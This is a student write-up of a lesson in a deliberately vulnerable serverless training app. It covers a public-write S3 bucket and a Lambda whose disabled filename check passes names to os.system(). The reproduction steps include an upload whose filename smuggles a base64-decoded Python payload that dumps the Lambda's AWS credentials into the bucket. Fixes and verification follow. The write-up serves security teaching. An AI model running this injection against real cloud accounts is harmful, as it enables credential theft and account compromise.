# Lesson 4 — Insecure Cloud Configuration

**Student:** Ibrahim Alshayea  
**Vulnerability class:** Insecure Cloud Configuration + Shell Command Injection  
**Affected components:** S3 bucket `dvsa-feedback-bucket-*` + `DVSA-FEEDBACK-UPLOADS` Lambda  

---

## Summary

Two misconfigrations cooperate:

1. **S3 bucket policy** uses `Principal: *` — any AWS account can upload files to the feedback
   bucket without going through the DVSA presigned URL flow.
2. **Lambda `is_safe()` function** has its semicolon/pipe checks commented out — it always
   returns `True`, so filenames are never rejected before being passed to `os.system()`.

An attacker uploads a file whose name contains a semicolon-injected shell command. The S3
event triggers `DVSA-FEEDBACK-UPLOADS`, which passes the filename directly to `os.system()`,
executing the attacker's code. The injected Python script uses `boto3` to write the Lambda's
environment variables (including temporary AWS credentials) to `loot.txt` in the same bucket.

**Impact:** Remote code execution → AWS credential theft → potential full account compromise.

---

## Root Cause

```python
# feedback_uploads.py — VULNERABLE
def is_safe(s):
    # if s.find(";") > -1 or s.find("'") > -1 or s.find("|") > -1:
    #    return False
    return True   # validation is disabled

def process_file(filename):
    os.system(f"touch /tmp/{filename} /tmp/{filename}.txt")  # shell injection
```

```json
{
  "Sid": "PublicWritefeedbackStatement",
  "Effect": "Allow",
  "Principal": "*",
  "Action": ["s3:PutObject", "s3:PutObjectAcl", "s3:GetObject", "s3:DeleteObject"],
  "Resource": "arn:aws:s3:::dvsa-feedback-bucket-<account>-us-east-1/*"
}
```

---

## Reproduction Steps

### Prerequisites
- AWS CLI configured with any valid AWS credentials
- The feedback bucket name (from CloudFormation outputs or S3 console)

```bash
export BUCKET="dvsa-feedback-bucket-<account-id>-us-east-1"
```

### Step 1 — Confirm public write access
```bash
touch /tmp/empty
aws s3 cp /tmp/empty "s3://$BUCKET/test" --acl public-read
```
If this succeeds, the bucket allows public write.

### Step 2 — Generate the Base64-encoded credential-theft payload
```bash
python3 exploit/generate_payload.py
```

Copy the printed Base64 string into the next step.

### Step 3 — Upload the malicious filename
```bash
BASE64_PAYLOAD="<output-from-step-2>"
aws s3 cp /tmp/empty \
  $"s3://$BUCKET/x;echo ${BASE64_PAYLOAD}|base64 -d|python3;#" \
  --acl public-read
```

### Step 4 — Wait and check CloudWatch
Go to **CloudWatch → `/aws/lambda/DVSA-FEEDBACK-UPLOADS`**. Look for a duration of
~8000 ms (vs <100 ms normally). This confirms the Python payload ran.

### Step 5 — Check for loot.txt in S3
```bash
aws s3 ls "s3://$BUCKET/"
aws s3 cp "s3://$BUCKET/loot.txt" /tmp/loot.txt && cat /tmp/loot.txt
```

The file contains `AWS_SESSION_TOKEN`, `AWS_SECRET_ACCESS_KEY`, and other secrets.

---

## Evidence

Screenshots to place in `screenshots/`:
- `4.1-upload-commands.png` — terminal showing successful malicious file upload
- `4.2-cloudwatch-8253ms.png` — Lambda ran for 8 seconds (payload executing)
- `4.3-loot-txt-in-s3.png` — loot.txt (2.6 KB) visible in bucket
- `4.4-loot-txt-contents.png` — stolen credentials (redacted)
- `4.5-is-safe-fix.png` — is_safe() with checks restored
- `4.6-bucket-policy-fixed.png` — bucket policy restricted to account owner
- `4.7-cloudwatch-1ms.png` — post-fix: Lambda completed in 1.84 ms

---

## Fix

### Fix 1 — Restore `is_safe()` validation in `DVSA-FEEDBACK-UPLOADS`

See [`fix/feedback_uploads.patch`](fix/feedback_uploads.patch):

```python
# BEFORE (vulnerable — checks commented out)
def is_safe(s):
    # if s.find(";") > -1 or s.find("'") > -1 or s.find("|") > -1:
    #    return False
    return True

# AFTER (safe — checks active)
def is_safe(s):
    if s.find(";") > -1 or s.find("'") > -1 or s.find("|") > -1:
        return False
    return True
```

### Fix 2 — Restrict the S3 bucket policy

Replace `Principal: *` with the account owner's ARN:

See [`fix/bucket-policy-fixed.json`](fix/bucket-policy-fixed.json).

---

## Verification

Re-upload the malicious filename. CloudWatch should show the Lambda completed in **~1.84 ms**
(rejected immediately by `is_safe()`). No new `loot.txt` should appear in the bucket.

---

## Takeaway

Two individually minor misconfigurations (public bucket + commented-out validation) combined
into a complete RCE → credential theft chain. In serverless systems, Lambda credentials are
always available as environment variables — over-privilege makes this instantly exploitable.
